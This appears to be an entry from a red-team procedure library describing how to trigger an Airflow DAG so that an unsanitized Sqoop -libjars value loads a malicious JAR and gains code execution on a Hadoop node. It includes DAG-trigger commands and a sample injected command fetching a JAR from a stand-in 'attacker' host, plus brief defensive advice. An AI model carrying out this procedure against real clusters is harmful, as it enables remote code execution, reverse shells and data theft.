---
id: proc-execute-dag-rce
tags:
  - rce
  - airflow
  - sqoop
  - hadoop
  - mapreduce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:41.316Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-DAG-to-Trigger-Sqoop-RCE

## Summary

This procedure triggers an Airflow DAG using a malicious Sqoop Connection, causing the SqoopHook to prepare and execute a command with the -libjars option, loading the malicious JAR and achieving RCE on the Hadoop MapReduce task machine.

## Description

When the DAG runs, Airflow invokes SqoopHook._prepare_command, which unsanitized pulls the libjars from the Connection and appends it to the Sqoop command line. This adds the JAR to the MapReduce classpath, executing its payload (e.g., arbitrary system commands) on the Linux-based Hadoop node. Requires the DAG to be scheduled or manually triggered. Expected outcome: Remote command execution, such as spawning a shell or data exfiltration.

## Requirements

1. Airflow scheduler running with access to Hadoop cluster
2. Malicious DAG and Connection in place
3. Permissions to trigger DAGs (user or admin)

## Defense

Defensive measures and detection strategies:

- Upgrade to patched Airflow Sqoop Provider (post-3.1.0)
- Enable logging for Sqoop commands and monitor for suspicious -libjars
- Isolate Hadoop task nodes and use containerization for tasks

## Objectives

1. Activate the libjars injection for code execution
2. Execute arbitrary commands on remote infrastructure
3. Confirm RCE via payload output

## Instructions

### Step 1: Trigger DAG Execution

**Context**: Initiate the DAG run to start Sqoop tasks.

Use Airflow UI: Navigate to DAGs > Select malicious DAG > Trigger DAG (manual).

> Or via CLI: `airflow dags trigger malicious-dag`

### Step 2: Monitor Sqoop Command Preparation

**Context**: During execution, observe how SqoopHook handles the libjars.

Inspect Airflow task logs in UI or `airflow tasks logs malicious-dag sqoop-task`.

> Look for command like: `sqoop ... -libjars http://attacker/malicious.jar ...` confirming injection.

### Step 3: Verify RCE on Target Machine

**Context**: Check for payload execution on the MapReduce node.

On Hadoop node (if accessible) or via payload (e.g., reverse shell): Monitor for executed commands like `id` or file writes.

> Expected: Evidence of arbitrary execution, e.g., new process or network connection from JAR load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[rce]]
- [[airflow]]
- [[sqoop]]
- [[hadoop]]
